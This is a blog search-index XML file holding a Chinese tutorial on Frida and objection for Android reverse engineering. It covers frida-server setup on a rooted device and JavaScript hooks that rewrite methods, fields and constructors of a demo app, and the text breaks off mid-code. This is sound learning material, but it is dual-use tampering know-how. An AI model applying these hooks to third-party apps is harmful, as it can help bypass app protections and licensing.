<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Frida</title>
      <link href="/2024/03/18/Frida/"/>
      <url>/2024/03/18/Frida/</url>
      
        <content type="html"><![CDATA[<h1 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h1><p>总体来自吾爱破解-正己的Frida篇教程</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>Frida 是一款开源的动态插桩工具，可以插入一些代码到原生App的内存空间去动态地监视和修改其行为，支持Windows、Mac、Linux、Android或者iOS，从安卓层面来讲，可以实现<code>Java</code>层和<code>Native</code>层<code>Hook</code>操作。</p><p>frida注入的原理就是找到目标进程,使用ptrace跟踪目标进程获取mmap，dlopen，dlsym等函数库的偏移获取mmap在目标进程申请一段内存空间将在目标进程中找到存放frida-agent-32&#x2F;64.so的空间启动执行各种操作由agent去实现</p><h2 id="插桩技术"><a href="#插桩技术" class="headerlink" title="插桩技术"></a>插桩技术</h2><p>frida使用的是<strong>动态二进制插桩技术</strong>（<strong>DBI</strong>），首先来了解一下插桩技术：</p><blockquote><p><em>插桩技术是指将额外的代码注入程序中以收集运行时的信息，可分为两种：</em><br>(1)源代码插桩[Source Code Instrumentation(SCI)]：顾名思义，在程序源代码的基础上增加（注入）额外的代码，从而达到预期目的或者功能；</p><p><img src="https://upload-images.jianshu.io/upload_images/16699345-1f9c315387387f81.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/522/format/webp" alt="img"></p><p>源代码插桩实例</p></blockquote><p>(2)二进制插桩（Binary Instrumentation）：额外代码注入到二进制可执行文件中，通过修改汇编地址，改变程序运行内容，运行后再返回到原来程序运行出处，从而实现程序的额外功能。<br> ●静态二进制插桩[Static Binary Instrumentation(SBI)]：在程序执行前插入额外的代码和数据，生成一个永久改变的可执行文件。<br> ●动态二进制插桩[Dynamic Binary Instrumentation(DBI)]：在程序运行时实时地插入额外代码和数据，对可执行文件没有任何永久改变。*</p><p><strong>DBI能做什么？</strong></p><blockquote><p>（1）访问进程的内存<br>（2）在应用程序运行时覆盖一些功能<br>（3）从导入的类中调用函数<br>（4）在堆上查找对象实例并使用这些对象实例<br>（5）Hook，跟踪和拦截函数等等</p></blockquote><h2 id="注入的两种模式"><a href="#注入的两种模式" class="headerlink" title="注入的两种模式"></a>注入的两种模式</h2><ol><li>attach模式<br> attach到已经存在的进程，核心原理是ptrace修改进程内存，如果进程处于调试状态（traceid不等于0），则attach失败</li><li>spawn模式<br> 启动一个新的进程并挂起，在启动的同时注入frida代码，适用于在进程启动前的一些hook，如hook RegisterNative等，注入完成后调用resume恢复进程。</li></ol><table><thead><tr><th align="left">注入模式</th><th align="left">描述</th><th align="left">命令或参数</th><th align="left">优点</th><th align="left">主要用途</th></tr></thead><tbody><tr><td align="left">Spawn模式</td><td align="left">将启动App的权利交由Frida来控制，即使目标App已经启动，在使用Frida注入程序时还是会重新启动App</td><td align="left">在CLI模式中，Frida通过加上 -f 参数指定包名以spawn模式操作App</td><td align="left">适合于需要在App启动时即进行注入的场景，可以在App启动时即捕获其行为</td><td align="left">当需要监控App从启动开始的所有行为时使用</td></tr><tr><td align="left">Attach模式</td><td align="left">在目标App已经启动的情况下，Frida通过ptrace注入程序从而执行Hook的操作</td><td align="left">在CLI模式中，如果不添加 -f 参数，则默认会通过attach模式注入App</td><td align="left">适合于已经运行的App，不会重新启动App，对用户体验影响较小</td><td align="left">在App已经启动，或者我们只关心特定时刻或特定功能的行为时使用</td></tr></tbody></table><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install frida==12.8.0</span><br><span class="line">pip install frida-tools==5.3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pip install objection</span><br><span class="line">objection -h</span><br></pre></td></tr></table></figure><p>下载frida-server并解压(<a href="https://github.com/frida/frida/releases/download/12.8.0/frida-server-12.8.0-android-arm64.xz">https://github.com/frida/frida/releases/download/12.8.0/frida-server-12.8.0-android-arm64.xz</a>)</p><p>先adb shell，然后切换到root权限,把之前push进来的frida server改个名字叫fs，然后运行frida</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push /Users/sakura/Desktop/lab/alpha/tools/android/frida-server-12.8.0-android-arm64 /data/local/tmp</span><br><span class="line"><span class="built_in">chmod</span> +x fs</span><br><span class="line">./fs</span><br></pre></td></tr></table></figure><p>如果要监听端口，就</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fs -l 0.0.0.0:8888</span><br></pre></td></tr></table></figure><p>安装源代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/oleavr/frida-agent-example.git</span><br><span class="line"><span class="built_in">cd</span> frida-agent-example/</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><ol><li>使用vscode打开此工程，在agent文件夹下编写js，会有智能提示。</li><li><code>npm run watch</code>会监控代码修改自动编译生成js文件</li><li>python脚本或者cli加载_agent.js<br> <code>frida -U -f com.example.android --no-pause -l _agent.js</code></li></ol><h2 id="frida-server基本操作"><a href="#frida-server基本操作" class="headerlink" title="frida-server基本操作"></a>frida-server基本操作</h2><p><code>frida-ps -U</code>查看通过usb连接的android手机上的进程。</p><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><table><thead><tr><th align="left">API名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>Java.use(className)</code></td><td align="left">获取指定的Java类并使其在JavaScript代码中可用。</td></tr><tr><td align="left"><code>Java.perform(callback)</code></td><td align="left">确保回调函数在Java的主线程上执行。</td></tr><tr><td align="left"><code>Java.choose(className, callbacks)</code></td><td align="left">枚举指定类的所有实例。</td></tr><tr><td align="left"><code>Java.cast(obj, cls)</code></td><td align="left">将一个Java对象转换成另一个Java类的实例。</td></tr><tr><td align="left"><code>Java.enumerateLoadedClasses(callbacks)</code></td><td align="left">枚举进程中已经加载的所有Java类。</td></tr><tr><td align="left"><code>Java.enumerateClassLoaders(callbacks)</code></td><td align="left">枚举进程中存在的所有Java类加载器。</td></tr><tr><td align="left"><code>Java.enumerateMethods(targetClassMethod)</code></td><td align="left">枚举指定类的所有方法。</td></tr></tbody></table><table><thead><tr><th><code>console.log()</code></th><th>使用JavaScript直接进行日志打印</th><th>多用于在CLI模式中，<code>console.log()</code>直接输出到命令行界面，使用户可以实时查看。在RPC模式中，<code>console.log()</code>同样输出在命令行，但可能被Python脚本的输出内容掩盖。</th></tr></thead><tbody><tr><td><code>send()</code></td><td>Frida的专有方法，用于发送数据或日志到外部Python脚本</td><td>多用于RPC模式中，它允许JavaScript脚本发送数据到Python脚本，Python脚本可以进一步处理或记录这些数据。</td></tr></tbody></table><h3 id="Hook普通方法、打印参数和修改返回值"><a href="#Hook普通方法、打印参数和修改返回值" class="headerlink" title="Hook普通方法、打印参数和修改返回值"></a>Hook普通方法、打印参数和修改返回值</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个名为hookTest1的函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//获取一个名为&quot;类名&quot;的Java类，并将其实例赋值给JavaScript变量utils</span></span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">    <span class="comment">//修改&quot;类名&quot;的&quot;method&quot;方法的实现。这个新的实现会接收两个参数（a和b）</span></span><br><span class="line">    utils.<span class="property">method</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">            <span class="comment">//将参数a和b的值改为123和456。</span></span><br><span class="line">        a = <span class="number">123</span>;</span><br><span class="line">        b = <span class="number">456</span>;</span><br><span class="line">        <span class="comment">//调用修改过的&quot;method&quot;方法，并将返回值存储在`retval`变量中</span></span><br><span class="line">        <span class="keyword">var</span> retval = <span class="variable language_">this</span>.<span class="title function_">method</span>(a, b);</span><br><span class="line">        <span class="comment">//在控制台上打印参数a，b的值以及&quot;method&quot;方法的返回值</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, retval);</span><br><span class="line">        <span class="comment">//返回&quot;method&quot;方法的返回值</span></span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Hook重载参数"><a href="#Hook重载参数" class="headerlink" title="Hook重载参数"></a>Hook重载参数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .overload()</span></span><br><span class="line"><span class="comment">// .overload(&#x27;自定义参数&#x27;)</span></span><br><span class="line"><span class="comment">// .overload(&#x27;int&#x27;)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//overload定义重载函数，根据函数的参数类型填</span></span><br><span class="line">    utils.<span class="property">Inner</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.zj.wuaipojie.Demo$Animal&#x27;</span>,<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a，b</span>)&#123;</span><br><span class="line">        b = <span class="string">&quot;aaaaaaaaaa&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title class_">Inner</span>(a,b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Hook构造函数"><a href="#Hook构造函数" class="headerlink" title="Hook构造函数"></a>Hook构造函数</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//修改类的构造函数的实现，$init表示构造函数</span></span><br><span class="line">    utils.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">        str = <span class="string">&quot;52&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.$init(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Hook字段"><a href="#Hook字段" class="headerlink" title="Hook字段"></a>Hook字段</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest5</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//静态字段的修改</span></span><br><span class="line">        <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//修改类的静态字段&quot;flag&quot;的值</span></span><br><span class="line">        utils.<span class="property">staticField</span>.<span class="property">value</span> = <span class="string">&quot;我是被修改的静态变量&quot;</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(utils.<span class="property">staticField</span>.<span class="property">value</span>);</span><br><span class="line">        <span class="comment">//非静态字段的修改</span></span><br><span class="line">        <span class="comment">//使用`Java.choose()`枚举类的所有实例</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">                    <span class="comment">//修改实例的非静态字段&quot;_privateInt&quot;的值为&quot;123456&quot;，并修改非静态字段&quot;privateInt&quot;的值为9999。</span></span><br><span class="line">                obj.<span class="property">_privateInt</span>.<span class="property">value</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">//字段名与函数名相同 前面加个下划线</span></span><br><span class="line">                obj.<span class="property">privateInt</span>.<span class="property">value</span> = <span class="number">9999</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Hook内部类"><a href="#Hook内部类" class="headerlink" title="Hook内部类"></a>Hook内部类</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//内部类</span></span><br><span class="line">        <span class="keyword">var</span> innerClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo$innerClass&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(innerClass);</span><br><span class="line">        innerClass.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;eeeeeeee&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="枚举所有的类与类的所有方法"><a href="#枚举所有的类与类的所有方法" class="headerlink" title="枚举所有的类与类的所有方法"></a>枚举所有的类与类的所有方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//枚举所有的类与类的所有方法,异步枚举</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">name,handle</span>)&#123;</span><br><span class="line">                    <span class="comment">//过滤类名</span></span><br><span class="line">                <span class="keyword">if</span>(name.<span class="title function_">indexOf</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>) !=-<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">                    <span class="keyword">var</span> clazz =<span class="title class_">Java</span>.<span class="title function_">use</span>(name);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(clazz);</span><br><span class="line">                    <span class="keyword">var</span> methods = clazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="枚举所有方法"><a href="#枚举所有方法" class="headerlink" title="枚举所有方法"></a>枚举所有方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Demo</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//getDeclaredMethods枚举所有方法</span></span><br><span class="line">        <span class="keyword">var</span> methods =<span class="title class_">Demo</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>; j &lt; methods.<span class="property">length</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">var</span> methodName = methods[j].<span class="title function_">getName</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(methodName);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> k=<span class="number">0</span>; k&lt;<span class="title class_">Demo</span>[methodName].<span class="property">overloads</span>.<span class="property">length</span>;k++)&#123;</span><br><span class="line">                <span class="title class_">Demo</span>[methodName].<span class="property">overloads</span>[k].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="variable language_">arguments</span>.<span class="property">length</span>;i++)&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">arguments</span>[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">this</span>[methodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="主动调用"><a href="#主动调用" class="headerlink" title="主动调用"></a>主动调用</h3><p>静态方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">ClassName</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>); </span><br><span class="line"><span class="title class_">ClassName</span>.<span class="title function_">privateFunc</span>(<span class="string">&quot;传参&quot;</span>);</span><br></pre></td></tr></table></figure><p>非静态方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ret = <span class="literal">null</span>;</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>,&#123;    <span class="comment">//要hook的类</span></span><br><span class="line">        <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">            ret=instance.<span class="title function_">privateFunc</span>(<span class="string">&quot;aaaaaaa&quot;</span>); <span class="comment">//要hook的方法</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(&quot;result: &quot; + ret);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//return ret;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Objection"><a href="#Objection" class="headerlink" title="Objection"></a>Objection</h2><p>objection是基于frida的命令行hook集合工具, 可以让你不写代码, 敲几句命令就可以对java函数的高颗粒度hook, 还支持RPC调用。可以实现诸如内存搜索、类和模块搜索、方法hook打印参数返回值调用栈等常用功能，是一个非常方便的，逆向必备、内存漫游神器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python使用的版本建议大于3.8，不然可能会报错，或者你调低frida以及objection的版本</span></span><br><span class="line">pip install objection==1.11.0</span><br><span class="line">pip install frida-tools==9.2.4</span><br><span class="line">frida 14.2.18</span><br></pre></td></tr></table></figure><h3 id="上手"><a href="#上手" class="headerlink" title="上手"></a>上手</h3><p>命令注释</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">objection --<span class="built_in">help</span>(<span class="built_in">help</span>命令)</span><br><span class="line">Checking <span class="keyword">for</span> a newer version of objection...</span><br><span class="line">Usage: objection [OPTIONS] COMMAND [ARGS]...</span><br><span class="line"></span><br><span class="line">       _   _         _   _</span><br><span class="line">   ___| |_|_|___ ___| |_|_|___ ___</span><br><span class="line">  | . | . | | -_|  _|  _| | . |   |</span><br><span class="line">  |___|___| |___|___|_| |_|___|_|_|</span><br><span class="line">        |___|(object)inject(ion)</span><br><span class="line"></span><br><span class="line">       Runtime Mobile Exploration</span><br><span class="line">          by: @leonjza from @sensepost</span><br><span class="line"></span><br><span class="line">  默认情况下，通信将通过USB进行，除非提供了`--network`选项。</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">  -N, --network            使用网络连接而不是USB连接。</span><br><span class="line">  -h, --host TEXT          [默认: 127.0.0.1]</span><br><span class="line">  -p, --port INTEGER       [默认: 27042]</span><br><span class="line">  -ah, --api-host TEXT     [默认: 127.0.0.1]</span><br><span class="line">  -ap, --api-port INTEGER  [默认: 8888]</span><br><span class="line">  -g, --gadget TEXT        要连接的Frida Gadget/进程的名称。 [默认: Gadget]</span><br><span class="line">  -S, --serial TEXT        要连接的设备序列号。</span><br><span class="line">  -d, --debug              启用带有详细输出的调试模式。(在堆栈跟踪中包括代&#123;过&#125;&#123;滤&#125;理源图)</span><br><span class="line">  --<span class="built_in">help</span>                   显示此消息并退出。</span><br><span class="line"></span><br><span class="line">命令:</span><br><span class="line">  api          以无头模式启动objection API服务器。</span><br><span class="line">  device-type  获取关于已连接设备的信息。</span><br><span class="line">  explore      启动objection探索REPL。</span><br><span class="line">  patchapk     使用frida-gadget.so补丁一个APK。</span><br><span class="line">  patchipa     使用FridaGadget dylib补丁一个IPA。</span><br><span class="line">  run          运行单个objection命令。</span><br><span class="line">  signapk      使用objection密钥对APK进行Zipalign和签名。</span><br><span class="line">  version      打印当前版本并退出。</span><br></pre></td></tr></table></figure><p>注入命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">objection -g 包名 explore</span><br><span class="line"></span><br><span class="line">-   <span class="built_in">help</span>：不知道当前命令的效果是什么，在当前命令前加<span class="built_in">help</span>比如:<span class="built_in">help</span> <span class="built_in">env</span>，回车之后会出现当前命令的解释信息</span><br><span class="line">-   按空格：不知道输入什么就按空格，会有提示出来</span><br><span class="line">-   <span class="built_in">jobs</span>：可以进行多项hook</span><br><span class="line">-   日志：objection的日志文件生成在 C:\Users\Administrator\.objection</span><br></pre></td></tr></table></figure><p>启动前就hook</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g 进程名 explore --startup-command <span class="string">&quot;android hooking watch class 路径.类名&quot;</span></span><br></pre></td></tr></table></figure><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p>memory list modules  -查看内存中加载的库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">memory list modules</span><br><span class="line">Save the output by adding `--json modules.json` to this <span class="built_in">command</span></span><br><span class="line">Name                                                              Base          Size                 Path</span><br><span class="line">----------------------------------------------------------------  ------------  -------------------  ------------------------------------------------------------------------------</span><br><span class="line">app_process64                                                     0x57867c9000  40960 (40.0 KiB)     /system/bin/app_process64</span><br><span class="line">linker64                                                          0x72e326a000  229376 (224.0 KiB)   /system/bin/linker64</span><br><span class="line">libandroid_runtime.so                                             0x72e164e000  2113536 (2.0 MiB)    /system/lib64/libandroid_runtime.so</span><br><span class="line">libbase.so                                                        0x72dfa67000  81920 (80.0 KiB)     /system/lib64/libbase.so</span><br><span class="line">libbinder.so                                                      0x72dec1c000  643072 (628.0 KiB)   /system/lib64/libbinder.so</span><br><span class="line">libcutils.so                                                      0x72de269000  86016 (84.0 KiB)     /system/lib64/libcutils.so</span><br><span class="line">libhidlbase.so                                                    0x72df4cc000  692224 (676.0 KiB)   /system/lib64/libhidlbase.so</span><br><span class="line">liblog.so                                                         0x72e0be1000  98304 (96.0 KiB)     /system/lib64/liblog</span><br></pre></td></tr></table></figure><p>memory list exports so名称 - 查看库的导出函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 